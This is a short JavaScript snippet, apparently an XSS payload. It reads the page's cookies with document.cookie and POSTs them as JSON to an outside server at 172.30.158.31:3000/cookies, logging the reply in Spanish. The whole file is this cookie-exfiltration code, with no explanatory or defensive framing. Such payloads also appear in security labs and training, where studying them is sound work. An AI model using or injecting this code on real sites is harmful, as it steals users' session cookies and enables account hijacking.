const cookies = document.cookie;

fetch('http://172.30.158.31:3000/cookies', { 
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({ cookies })
})
.then(response => response.text())
.then(data => {
    console.log('Respuesta del servidor:', data);
})
.catch(error => console.error('Error:', error));